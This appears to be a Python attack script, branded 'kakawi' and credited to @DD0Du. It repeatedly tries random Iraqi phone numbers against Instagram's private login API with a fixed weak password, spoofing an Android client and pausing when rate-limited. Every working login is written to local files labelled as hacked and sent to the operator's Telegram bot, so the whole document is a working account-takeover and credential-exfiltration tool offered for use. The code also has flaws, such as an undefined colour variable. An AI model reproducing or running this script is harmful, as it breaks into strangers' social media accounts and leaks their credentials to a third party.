import requests,sys,time,os,random,pyfiglet,colorama,secrets,uuid
from secrets import token_hex
from time import sleep
from uuid import uuid4
uid = uuid.uuid4()
cookie = secrets.token_hex(8) * 2

#---------------{الوان}-------------#
Z = '\033[1;31m'
A = "\033[1;91m"
B = "\033[1;90m" 
C = "\033[1;97m" 
E = "\033[1;92m" 
H = "\033[1;93m" 
K = "\033[1;94m" 
L = "\033[1;95m" 

os.system('clear')
print(str(pyfiglet.figlet_format('kakawi'))+f"{E} By :- @DD0Du\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"")

ID =input('Enter YOUR ID : ')
tok =input('Enter TOKEN BOT : ')

print(f"{E}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
user = '1234567890'
pas = ("1122334455","1122334455","1122334455","1122334455","1122334455","1122334455","1122334455")
while True:
    H1 = str("".join(random.choice(user)for i in range(7)))
    username= '+964771'+H1
    password = random.choice(pas)
    if username =='':
        exit()
    if password =='':
        exit()
    cookies = token_hex(8) * 2
    url='https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
    data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req= requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        with open('kaakwi.txt', 'a') as (HACKED):
          HACKED.write(f'.. Hi Instagram ✅ .\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.✉️. E-mail ==> {username} \n.🚫. PassWord ==> {password}\n ︎. ––––––––––––––––︎ . \n. By  ==> @DD0Du \n')
          print(f'{G}. Hi Instagram ✅ .\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.✉️. E-mail ==> {username} \n.🚫. PassWord ==> {password}\n ︎. ––––––––––––––––︎ . \n. By  ==> @DD0Du ')
          tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=. Hi Instagram ✅ .\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉️. E-mail ==> {username} \n.🚫. PassWord ==> {password}\n ︎. ––––––––––––––––︎ . \n. By ==> @DD0Du"
        i = requests.post(tlg)
    if '"message":"challenge_required"' in req.text:
        with open('Secure.txt', 'a') as (SECURE):
            SECURE.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            print(f'{A} user : {username} | PassWord : {password}')
    if "'message': 'Please wait a few minutes before you try again.'" in req.json():
          print('Wait')
          sleep(30)
    else:
        print(f'{Z} user : {username} | PassWord : {password}')